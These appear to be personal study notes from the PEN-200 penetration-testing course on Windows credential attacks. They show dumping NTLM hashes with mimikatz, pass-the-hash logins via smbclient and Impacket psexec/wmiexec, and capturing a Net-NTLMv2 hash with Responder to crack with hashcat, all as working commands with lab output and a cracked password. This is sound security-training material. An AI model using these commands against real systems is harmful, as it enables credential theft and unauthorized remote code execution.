# PEN 200 random notes
## Dumping creds from LSASS with mimikatz
* LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module. We need to understand that **LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator**.
* Due to this, **we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege access right enabled**. This access right grants us the ability to debug not only processes we own, but also all other users’ processes.
* **We can also elevate our privileges to the SYSTEM account with tools like PsExec or the built-in Mimikatz token elevation function to obtain the required privileges**. The token elevation function requires the SeImpersonatePrivilege access right to work, but all local administrators have it by default.
## NTLM PassTheHash (PtH) attack
### Info
* We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password.
* This is possible because NTLM/LM password hashes are not salted and remain static between sessions.
* If we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password.
* **To leverage this into code execution of any kind, the account also needs administrative privileges on the second target**.
* If we don’t use the local Administrator user in pass-the-hash, the target machine also needs to be configured in a certain way to obtain successful code execution.
  * Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default. This prevents software or commands from running with administrative rights on remote systems.
* **It is quite common and is often found in real-life assessments that the local Administrator accounts have the same password on multiple machines!!!**
### Tools
* To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes.
  * SMB enumeration and management: **smbclient**, **CrackMapExec**, **mimikatz (built in stuff)**
  * Command execution: **psexec.py (from Impacket)**, **wmiexec.py (from Impacket)**, **mimikatz (built in stuff)**
* We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like **RDP** and **WinRM**!
### Attack
<pre>
# Extraction Admin password with mimikatz
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # lsadump::sam
...
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 7a38310ea6f0027ee955abed1762964b

# Connect through SMB with obtained NTLM hash
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash
7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
. D 0 Thu Jun 2 16:55:37 2022
.. DHS 0 Thu Jun 2 16:55:35 2022
secrets.txt A 4 Thu Jun 2 11:34:47 2022

# Connect with psexec
kali@kali:~$ impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

# Connect with wmiexec
kali@kali:~$ impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
C:\>
</pre>
## Cracking Net-NTLMv2
### Info
* In some penetration tests, we may obtain code execution or a shell on a Windows system as an **unprivileged user**.
* This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes.
* In situations like these, we can abuse the Net-NTLMv2 network authentication protocol.
* This protocol is responsible for managing the authentication process for Windows clients and servers over a network.
* Our specific goal is to use Net-NTLMv2 for this exercise since it is **less secure than the more modern Kerberos protocol**.
* This is common in the real-world since the majority of Windows environments still rely on the older protocol, especially as a way to support older devices that may not support Kerberos.
### Attack
<pre>
<b># Check current user and privileges on victim machine</b>
C:\Windows\system32> whoami
whoami
<b>files01\paul</b>

C:\Windows\system32> net user paul
net user paul
User name paul
Full Name paul power
Comment
User's comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never
Password last set 6/3/2022 10:05:27 AM
Password expires Never
Password changeable 6/3/2022 10:05:27 AM
Password required Yes
User may change password Yes
Workstations allowed All
Logon script
User profile
Home directory
Last logon 6/3/2022 10:29:19 AM
Logon hours allowed All
<b>Local Group Memberships *Remote Desktop Users *Users</b>
Global Group memberships *None
The command completed successfully.

<b># Start Responder on attack machine</b>
kali@kali:~$ sudo responder -I tap0
__
.----.-----.-----.-----.-----.-----.--| |.-----.----.
| _| -__|__ --| _ | _ | | _ || -__| _|
|__| |_____|_____| __|_____|__|__|_____||_____|__|
|__|
NBT-NS, LLMNR & MDNS Responder 3.1.1.0
Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CTRL-C
...
HTTP server [ON]
HTTPS server [ON]
WPAD proxy [OFF]
Auth proxy [OFF]
<b>SMB server [ON]</b>
...
[+] Listening for events...

<b># Send request to a non-existent SMB share</b>
C:\Windows\system32>dir \\192.168.119.2\<b>test</b>
dir \\192.168.119.2\test
Access is denied.

<b># Responder got the request and the Net-NTLMv2 hash</b>
...
[+] Listening for events...
[SMB] NTLMv2-SSP Client : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash :
<b>paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D003400
44004E004800550058004300340054004900430004003400570049004E002D00340044004E004800550058
00430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D00
52002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000
B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70
090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000
000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000
000000000000</b>

<b># Search appropriate hashcat module</b>
kali@kali:~$ hashcat --help | grep -i "ntlm"
5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
<b>5600 | NetNTLMv2 | Network Protocol</b>
27100 | NetNTLMv2 (NT) | Network Protocol
1000 | NTLM | Operating System

<b># Cracking Net-NTLMv2 hash</b>
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050
cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d003400
44004e004800550058004300340054004900430004003400570049004e002d00340044004e004800550058
00430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d00
52002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000
b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70
090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000
000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000
000000000000:<b>123Password123</b>
...

<b># We can now connect through RDP because the user is in the RDP group!!!</b>
...
</pre>
## 
